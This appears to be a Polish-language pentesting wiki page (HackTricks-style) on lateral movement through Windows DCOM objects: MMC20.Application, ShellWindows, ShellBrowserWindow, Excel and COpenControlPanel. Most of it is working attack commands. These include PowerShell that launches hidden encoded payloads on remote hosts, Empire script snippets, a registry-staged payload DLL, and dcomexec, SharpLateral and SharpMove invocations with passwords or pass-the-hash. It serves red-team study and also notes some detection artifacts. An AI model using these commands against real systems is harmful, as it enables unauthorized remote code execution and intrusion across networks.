# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement jest atrakcyjny, ponieważ ponownie wykorzystuje istniejące serwery COM udostępniane przez RPC/DCOM, zamiast tworzyć usługę lub zaplanowane zadanie. W praktyce oznacza to, że początkowe połączenie zwykle rozpoczyna się na TCP/135, a następnie przechodzi na dynamicznie przypisane wysokie porty RPC.

## Wymagania wstępne i pułapki

- Zwykle potrzebny jest kontekst lokalnego administratora na celu, a zdalny serwer COM musi zezwalać na zdalne uruchamianie/aktywację.
- Od **14 marca 2023 r.** firma Microsoft wymusza DCOM hardening w obsługiwanych systemach. Starsze klienty, które żądają niskiego poziomu uwierzytelniania aktywacji, mogą zakończyć działanie niepowodzeniem, chyba że wynegocjują co najmniej `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Współczesne klienty Windows zwykle automatycznie podnoszą ten poziom, więc obecne narzędzia zazwyczaj nadal działają.<sup>[[3]](#references)</sup>
- Ręczne lub skryptowe wykonywanie DCOM zasadniczo wymaga TCP/135 oraz zakresu dynamicznych portów RPC celu. Jeśli używasz `dcomexec.py` z Impacket i chcesz otrzymać wynik polecenia, zwykle potrzebujesz również dostępu SMB do `ADMIN$` (lub innego udziału z możliwością odczytu/zapisu).
- Jeśli RPC/DCOM działa, ale SMB jest zablokowane, `dcomexec.py -nooutput` może nadal być przydatne do wykonywania poleceń bez informacji zwrotnej.

Szybkie sprawdzenia:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Więcej informacji na temat tej techniki znajdziesz w [oryginalnym wpisie dotyczącym MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Obiekty Distributed Component Object Model (DCOM) zapewniają interesujące możliwości interakcji z obiektami za pośrednictwem sieci. Firma Microsoft udostępnia kompleksową dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Listę aplikacji DCOM można pobrać za pomocą polecenia PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Obiekt COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), umożliwia skryptowanie operacji przystawek MMC. Warto zauważyć, że ten obiekt zawiera metodę `ExecuteShellCommand` w obiekcie `Document.ActiveView`. Więcej informacji o tej metodzie można znaleźć [tutaj](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Sprawdź jej działanie:<sup>[[6]](#references)</sup>

Ta funkcja umożliwia wykonywanie poleceń przez sieć za pośrednictwem aplikacji DCOM. Aby zdalnie korzystać z DCOM jako administrator, można użyć PowerShell w następujący sposób:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Następnie można wywołać metodę ExecuteShellCommand, aby uruchomić proces na zdalnym hoście. Proces obejmuje następujące kroki:

Sprawdź metody:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Uzyskaj RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Ostatni argument określa styl okna. `7` utrzymuje okno w stanie zminimalizowanym. Z operacyjnego punktu widzenia wykonanie oparte na MMC zwykle prowadzi do uruchomienia zdalnego procesu `mmc.exe`, który tworzy proces z payloadem, co różni się od obiektów opartych na Explorerze opisanych poniżej.

## ShellWindows & ShellBrowserWindow

**Więcej informacji o tej technice znajdziesz w oryginalnym poście [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Zidentyfikowano, że obiekt **MMC20.Application** nie ma jawnych uprawnień „LaunchPermissions”, domyślnie korzystając z uprawnień zezwalających Administratorom na dostęp. Więcej szczegółów można znaleźć [tutaj](https://twitter.com/tiraniddo/status/817532039771525120); zaleca się również użycie OleView .NET autorstwa [@tiraniddo](https://twitter.com/tiraniddo) do filtrowania obiektów bez jawnego Launch Permission.

Dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, wyróżniono ze względu na brak jawnych Launch Permissions. Brak wpisu rejestru `LaunchPermission` w `HKCR:\AppID\{guid}` oznacza brak jawnych uprawnień.

W porównaniu z `MMC20.Application` obiekty te są często cichsze z perspektywy OPSEC, ponieważ polecenie zwykle kończy jako proces potomny `explorer.exe` na zdalnym hoście zamiast `mmc.exe`.

### ShellWindows

W przypadku `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` umożliwiają utworzenie instancji obiektu za pomocą jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po utworzeniu instancji możliwa jest interakcja za pośrednictwem metody `WindowsShell.Item`, co prowadzi do wywołania metody, takiej jak `Document.Application.ShellExecute`.

Przedstawiono przykładowe polecenia PowerShell służące do utworzenia instancji obiektu i zdalnego wykonania poleceń:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` jest podobny, ale można go utworzyć bezpośrednio za pomocą jego CLSID i wykonać pivot do `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement z obiektami DCOM Excel

Lateral Movement można osiągnąć poprzez wykorzystanie obiektów DCOM Excel. Szczegółowe informacje można znaleźć w omówieniu wykorzystania Excel DDE do Lateral Movement za pośrednictwem DCOM na [blogu Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Projekt Empire udostępnia skrypt PowerShell, który demonstruje wykorzystanie Excel do zdalnego wykonywania kodu (RCE) poprzez manipulowanie obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępnego w [repozytorium Empire na GitHubie](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), pokazujące różne metody wykorzystania Excel do RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Nowsze badania rozszerzyły ten obszar o metodę `ActivateMicrosoftApp()` obiektu `Excel.Application`. Kluczowa idea polega na tym, że Excel może próbować uruchomić starsze aplikacje Microsoft, takie jak FoxPro, Schedule Plus lub Project, wyszukując je w systemowej zmiennej `PATH`. Jeśli operator może umieścić payload o jednej z oczekiwanych nazw w zapisywalnej lokalizacji znajdującej się w `PATH` celu, Excel go uruchomi.<sup>[[4]](#references)</sup>

Wymagania dla tej odmiany:

- Local admin na celu
- Excel zainstalowany na celu
- Możliwość zapisania payloadu w zapisywalnym katalogu znajdującym się w `PATH` celu

Praktyczny przykład wykorzystujący wyszukiwanie FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Jeśli host atakujący nie ma zarejestrowanego lokalnie identyfikatora ProgID `Excel.Application`, utwórz obiekt zdalny zamiast tego, używając identyfikatora CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Wartości zaobserwowane jako wykorzystywane w praktyce:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — ładowanie zarejestrowanej biblioteki DLL Control Panel

Klasa `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) udostępnia `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Jej metoda `Open()` powoduje załadowanie przez zdalny `dllhost.exe` bibliotek DLL Control Panel zarejestrowanych w kluczu `Control Panel\Cpls`. Klasa nie ma jawnie określonych uprawnień uruchamiania/dostępu w testowanych systemach, więc dziedziczy domyślną politykę DCOM (zwykle wymagającą uprawnień administratora do zdalnej aktywacji). Losowa nazwa elementu wystarcza, aby `Open()` przetworzyła zarejestrowane biblioteki DLL; payload nie musi mieć rozszerzenia `.cpl`, ale musi być prawidłową biblioteką DLL właściwej architektury.<sup>[[7]](#references)</sup>

Ten primitive to **stage-and-trigger**, a nie command-only execution: najpierw skopiuj bibliotekę DLL na cel i utwórz wartość `REG_EXPAND_SZ` wskazującą na nią, a następnie aktywuj obiekt przez DCOM. Na przykład z kontekstu administracyjnego Windows:<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
Publiczny klient [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementuje nieudokumentowane wywołanie DCOM za pomocą Impacket. Wystarczy podać dowolną nazwę elementu Panelu sterowania; klient może zgłosić błąd RPC, mimo że `dllhost.exe` załadował bibliotekę DLL.<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
Operacyjnie ta ścieżka wymaga również kanału zapisu plików i zdalnego dostępu do rejestru, więc jest bardziej hałaśliwa niż `MMC20`/`ShellWindows`. Tworzy efekt uboczny w postaci persistence, ponieważ późniejsze otwarcie Panelu sterowania może ponownie załadować ten sam wpis. Usuń wartość po wykonaniu i wyszukuj nieoczekiwanych wartości `Control Panel\Cpls` wraz z nietypowym ładowaniem bibliotek DLL w `dllhost.exe`.<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Narzędzia automatyzacji Lateral Movement

W celu automatyzacji tych technik wyróżniono dwa narzędzia:

- **Invoke-DCOM.ps1**: Skrypt PowerShell udostępniony przez projekt Empire, który upraszcza wywoływanie różnych metod wykonywania kodu na zdalnych maszynach. Skrypt jest dostępny w repozytorium GitHub projektu Empire.

- **SharpLateral**: Narzędzie przeznaczone do zdalnego wykonywania kodu, którego można użyć za pomocą polecenia:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatyczne narzędzia

- Skrypt Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) umożliwia łatwe wywoływanie wszystkich opisanych sposobów wykonywania kodu na innych maszynach.
- Możesz użyć `dcomexec.py` z Impacket do wykonywania poleceń na zdalnych systemach za pomocą DCOM. Obecne wersje obsługują `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a domyślnie używają `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Możesz również użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Możesz również użyć [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Ruch boczny przy użyciu obiektu COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Ruch boczny przez DCOM: Runda 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — Zarządzanie zmianami dotyczą­cymi obejścia funkcji zabezpieczeń serwera Windows DCOM (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Ruch boczny: wykorzystanie możliwości aplikacji DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Wykorzystanie Excel DDE do ruchu bocznego przez DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com — Klasa aplikacji MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Używanie obiektów DCOM do zdalnego wykonywania poleceń](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
